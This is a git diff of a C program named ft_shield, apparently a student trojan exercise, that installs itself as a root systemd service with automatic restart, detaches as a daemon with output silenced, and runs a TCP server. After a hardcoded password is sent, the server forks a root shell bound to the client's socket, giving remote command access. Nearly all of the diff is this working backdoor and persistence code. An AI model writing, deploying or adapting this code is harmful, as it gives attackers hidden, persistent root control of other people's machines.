@@ -1,4 +1,3 @@
-char arr[10];
 #include <stdbool.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
@@ -6,6 +5,7 @@ char arr[10];
 #include <unistd.h>
 #include <sys/stat.h>
 #include <stdio.h>
+#include <sys/wait.h>
 #include "string.h"
 #include <fcntl.h>
 #include "stdlib.h"
@@ -26,13 +26,10 @@ char daemon_config_path[] = "/etc/systemd/system/";
 char service_path[] = "/etc/systemd/system/ft_shield.service";
 char daemon_config[]  = "[Unit]\nDescription=ft_shield\nAfter=network.target\n[Service]\nWorkingDirectory=/bin\nExecStart=/bin/ft_shield\nRestart=always\nType=forking\nUser=root\n[Install]\nWantedBy=multi-user.target\n";
 
-
 char cmd[1000];
 char filePath[600];
 
-typedef struct server {
 
-} t_server;
 
 bool in_bin(){
 	char cwd[PATH_MAX];
@@ -42,7 +39,6 @@ bool in_bin(){
 		exit(1);
 	if (realpath(target_dir,target_dir) == NULL)
 		exit(1);
-	printf("%s = %s\n", cwd, target_dir);
 	return strcmp(cwd, target_dir) == 0;
 }
 
@@ -156,13 +152,6 @@ void configure_daemon(){
 
 	// now that we have binnary let's set the service 
 	setUpService();
-	printf("------------\n");
-	printf("we have access to write our service");
-	printf("Daemon configuration\n%s", daemon_config);
-
-
-
-    
 }
 
 
@@ -186,47 +175,269 @@ void start_daemon(){
 		exit(1);
 	// Change the current working directory to root.
 	chdir("/");
-	// Close stdin. stdout and stderr
-	close(STDIN_FILENO);
-	close(STDOUT_FILENO);
-	close(STDERR_FILENO);	
 
-    	for (int i = 0; i < 10000; i++){
-        	sleep(4);
-    	}
+    	int fd = open("/dev/null", O_RDWR);
+	if (fd < 0)
+		exit(1);
+
+	// Close stdin. stdout and stderr and redirect them to /dev/null
+    	if (dup2(fd , 0) == -1 || dup2(fd , 1) == -1 || dup2(fd , 2) == -1)
+        	exit(1);
 }
 
-int create_socket(struct sockaddr_in *address) {
-    int s_fd;
-    int opt = 1;
+int create_socket() {
+	int s_fd;
+	int opt = 1;
+	struct sockaddr_in address;
 
-    if ((s_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
-        perror("socket failed");
-        exit(EXIT_FAILURE);
-    }
+	if ((s_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) 
+		exit(EXIT_FAILURE);
 
-    address->sin_family = AF_INET;
-    address->sin_addr.s_addr = INADDR_ANY;
-    address->sin_port = htons(PORT);
+	address.sin_family = AF_INET;
+	address.sin_addr.s_addr = INADDR_ANY;
+	address.sin_port = htons(PORT);
 
-    if (setsockopt(s_fd, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)))
-        exit(EXIT_FAILURE);
-    
+	if (setsockopt(s_fd, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)))
+		exit(EXIT_FAILURE);
 
-    if (bind(s_fd, (struct sockaddr *)address, sizeof(*address)) < 0) 
-        exit(EXIT_FAILURE);
-    
 
-    if (listen(s_fd, 3) < 0) 
-        exit(EXIT_FAILURE);
+	if (bind(s_fd, (struct sockaddr *)&address, sizeof(address)) < 0) 
+		exit(EXIT_FAILURE);
 
-    return s_fd;
+
+	if (listen(s_fd, 3) < 0) 
+		exit(EXIT_FAILURE);
+
+	return s_fd;
 }
 
-void reverse_shell(){
+typedef struct client {
+	int fd;
+	pid_t pid;
+	bool auth;
+} t_client;
+
+
+typedef struct server {
+	t_client cl[3];
+	int fd;
+	struct pollfd fds[4];
+	int n_conn;
+} t_server;
+
+t_server server;
+
+char new_conn_dbg[] = "new connection\n";
+char dbg_start[] = "server_started\n";
+char new_conn_faill[] = "fail connection\n";
+char dbg_by[] = "connection closed\n";
+char dbg_msg[] = "msg received :\n";
+char dbg_pass[] = "valid password:\n";
+char password[] = "Hatim";
+
+bool add_client(int fd){
+	for (int i = 0; i < sizeof(server.fds) / sizeof(struct pollfd); i++){
+		if (server.fds[i].fd == -1){
+			server.fds[i] = (struct pollfd){fd,  POLLIN};
+			return true;
+		}
+	}
+	return false;
+}
+
+
+void add_client_authenticated(int fd){
+
+	for (int i = 0; i < sizeof(server.cl) / sizeof(t_client); i++){
+		if (server.cl[i].fd == -1){
+			server.cl[i].fd = fd;
+			server.cl[i].auth = true;
+			break;
+		}
+	}
+}
+
+bool is_client_auth(int fd){
+
+	for (int i = 0; i < sizeof(server.cl) / sizeof(t_client); i++){
+		if (server.cl[i].fd == fd && server.cl[i].auth == true)
+			return true;
+	}
+	return false;
+}
+
+bool authenticate_client(int fd){
+
+	for (int i = 0; i < sizeof(server.cl) / sizeof(t_client); i++){
+		if (server.cl[i].fd == -1){
+			server.cl[i].auth = true;
+			server.cl[i].fd = fd;
+			return true;
+		}
+	}
+	return false;
+}
+
+bool add_pid_to_auth_client(int fd, pid_t pid){
+
+	// close fd from the main process we don't need it 
+	close(fd);
+	for (int i = 0; i < sizeof(server.cl) / sizeof(t_client); i++){
+		if (server.cl[i].fd == fd && server.cl[i].auth){
+			server.cl[i].pid = pid;
+			return true;
+		}
+	}
+	return false;
+}
 
 
 
+void remove_client(int fd){
+
+	close(fd);
+	for (int i = 0; i < sizeof(server.fds) / sizeof(struct pollfd); i++){
+		if (server.fds[i].fd == fd){
+			server.fds[i].fd = - 1;
+		}
+	}
+	for (int i = 0; i < sizeof(server.cl) / sizeof(t_client); i++){
+		if (server.cl[i].fd == fd){
+			server.cl[i].fd = -1;
+			server.cl[i].auth = false;
+			server.cl[i].pid = -1;
+		}
+	}
+}
+
+
+
+void alert_client(int fd, char *msg, int len){
+	send(fd, msg, len, 0);
+}
+
+bool valid_password(char *buffer){
+
+	return strcmp(buffer, password) == 0;
+}
+
+
+pid_t reverse_shell(int fd){
+	pid_t pid = fork();
+
+	if (pid  < 0)
+		exit(1);
+	if (pid == 0){
+		dup2(fd, 0);
+    		dup2(fd, 1);
+    		dup2(fd, 2);
+		char * const argv[] = {"sh", NULL};
+    		execvp("sh", argv);
+	}
+	return pid;
+}
+
+
+
+void init_server(){
+	for (int i = 0; i < sizeof(server.fds) / sizeof(struct pollfd); i++){
+		server.fds[i].fd  = -1;
+		server.fds[i].events  = 0;
+		server.fds[i].revents= 0;
+	}
+	
+	for (int i = 0; i < sizeof(server.cl) / sizeof(t_client); i++){
+		server.cl[i].fd = -1;
+		server.cl[i].auth = false;
+		server.cl[i].pid = -1;
+	}
+
+	server.fd = create_socket();
+	// adding the file discriptor of the server to the array
+	server.fds[0] = (struct pollfd){server.fd,  POLLIN};
+}
+
+
+
+
+void monitor_processes(){
+	for (int i = 0; i < sizeof(server.cl) / sizeof(t_client); i++){
+
+		// a process exited
+		if (server.cl[i].pid != -1 && waitpid(server.cl[i].pid, NULL, WNOHANG) != 0){
+			remove_client(server.cl[i].fd);
+		}
+	}
+}
+
+
+void server_reverse_shell(){
+	init_server();
+	// dbug purpose
+	int dbg = open("/tmp/ft_shield.log", O_TRUNC | O_CREAT | O_RDWR);
+	if (dbg < 0)
+		exit(1);
+	
+	// set the whole array to zero
+	
+
+	write(dbg ,dbg_start, sizeof(dbg_start));
+	while (true){
+		if (poll(server.fds, sizeof(server.fds) / sizeof(struct pollfd), -1) < 0)
+			exit(0);
+
+		for (int i = 0; i < sizeof(server.fds) / sizeof(struct pollfd); i++){
+			if ((!server.fds[i].revents & POLLIN) || server.fds[i].fd == -1)
+				continue;
+
+			// new connection 
+			if (server.fds[i].fd  ==  server.fd){
+				int client_fd = accept(server.fd, NULL, NULL);
+				if (client_fd < 0) 
+					continue;
+				if (!add_client(client_fd)){
+					close(client_fd);
+					write(dbg ,new_conn_faill, sizeof(new_conn_faill));
+					continue;
+				}
+			}
+			else {
+				// client need to provide password  
+				int client_fd = server.fds[i].fd;
+				int n = recv(client_fd, cmd, 100, 0);
+				if (n <= 0){
+					// remove client
+					remove_client(client_fd);
+					write(dbg ,dbg_by, sizeof(dbg_by));
+					continue;
+				}
+				cmd[n - 1]  = '\0';
+				//if user authenticated 
+				if (is_client_auth(client_fd)){
+					if (strcmp("SHELL", cmd) == 0){
+						pid_t pid = reverse_shell(client_fd);
+						add_pid_to_auth_client(client_fd, pid);
+					}else{
+						char *msg = "SHELL to get access to the shell as root users\n";
+						alert_client(client_fd, msg , strlen(msg));
+					}
+				}
+				else {
+					// not authenticated and invalid password
+					if (!valid_password(cmd)){
+						char *msg = "Invalid password\n";
+						write(dbg ,dbg_pass, sizeof(dbg_pass));
+						alert_client(client_fd, msg , strlen(msg));
+					}else{
+						char *msg = "You are authenticated\nWelcom to your reverse shell\n";
+						alert_client(client_fd, msg , strlen(msg));
+						authenticate_client(client_fd);
+					}
+				}
+			}
+		}
+		monitor_processes();
+	}
 }
 
 
@@ -235,26 +446,20 @@ int main(){
     // if we are in /bin 
     if (getuid() != 0){
         printf("you don't have root access\n");
+	exit(0);
     }
-    display_login();
     
 
 
 
     if (in_bin()) {
         printf("we are at bin\n");
-	start_daemon();
-	reverse_shell();
+    	start_daemon();
+    	server_reverse_shell();
     } else {
-        printf("ooops we are not at bin\n");
-	   // start_daemon();
+       	   display_login();
+	   start_daemon();
 	   configure_daemon();
-
     }
-
-
-
-
-
     return 0;
 }
